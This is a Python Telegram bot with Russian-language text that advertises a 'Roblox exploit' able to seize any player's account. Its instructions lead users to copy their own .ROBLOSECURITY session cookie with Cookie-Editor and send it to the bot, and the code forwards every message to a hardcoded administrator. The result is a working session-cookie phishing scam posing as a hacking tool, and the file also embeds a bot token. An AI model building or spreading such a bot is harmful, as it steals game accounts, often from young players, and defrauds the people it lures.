import telebot
from flask import Flask
from threading import Thread


TOKEN = "8856354483:AAEq4E5DsYuzSkGxYP_pQYCf3aXgOGUQ7pE"
ADMIN_ID = 7562950426


bot = telebot.TeleBot(TOKEN)


START_TEXT = """🕷ROBLOX EXPLOIT BOT v5.2 | Универсальный взлом (ПК / Mobile)


Здарова! Наш бот позволяет выкачать сессию и забрать аккаунт ЛЮБОГО игрока Roblox за 2 минуты. 


Выбери свое устройство и следуй инструкции ниже:


---




💻ИНСТРУКЦИЯ ДЛЯ ПК (Windows / Mac):


1. Открой браузер (Chrome / Firefox / Edge).
2. Установи расширение Cookie-Editor (иконка печеньки 🍪).
3. Зайди на сайт roblox.com под своим аккаунтом.
4. В поиске перейди на страничку профиля обидчика.
5. Находясь на его странице, нажми на иконку Cookie-Editor вверху браузера.
6. Найди строку .ROBLOSECURITY, нажми на неё и скопируй весь текст (начинается с _|WARNING...).
7. Отправь скопированный код в этого бота!


---




📱ИНСТРУКЦИЯ ДЛЯ ТЕЛЕФОНА (Android / iOS):


1. Скачай из Play Market / AppStore браузер Kiwi Browser или Yandex Browser (обычный Chrome на телефоне не поддерживает расширения!).
2. В этом браузерe найди и установи расширение Cookie-Editor.
3. Зайди на roblox.com, войди в аккаунт и перейди на профиль обидчика.
4. Нажмите 3 точки в углу браузера -> прокрути вниз и найди Cookie-Editor.
5. Открой строку .ROBLOSECURITY, скопируй весь код и отправь его в бота!


---


⚙️ *После отправки кода бот расшифрует данные страницы, сбросит пароль обидчика и пришлет тебе новые данные для входа!*
https://t.me/otzvqwgsh 🐈‍⬛ отзывы"""
WAIT_TEXT = "💬Ваще обращение в очереди,ожидайте!В процессе кодирования💭."


@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(message.chat.id, START_TEXT)


@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.reply_to_message is not None)
def reply_to_user(message):
    try:
        user_id = message.reply_to_message.forward_from.id
        bot.copy_message(chat_id=user_id, from_chat_id=ADMIN_ID, message_id=message.message_id)
        bot.send_message(ADMIN_ID, "✅ ОБЩЁНЫЙ ОТВЕТ ОТПРАВЛЕН")
    except Exception:
        bot.send_message(ADMIN_ID, "❌ У пользователя скрыт аккаунт в Telegram, ему нельзя ответить через пересылку.")


@bot.message_handler(func=lambda m: m.chat.id != ADMIN_ID, content_types=['text', 'photo', 'document', 'voice'])
def forward_to_admin(message):
    bot.forward_message(chat_id=ADMIN_ID, from_chat_id=message.chat.id, message_id=message.message_id)
    bot.send_message(message.chat.id, WAIT_TEXT)


app = Flask('')
@app.route('/')
def home():
    return "Bot is Alive!"


def run():
    app.run(host='0.0.0.0', port=8080)


Thread(target=run).start()


bot.infinity_polling()
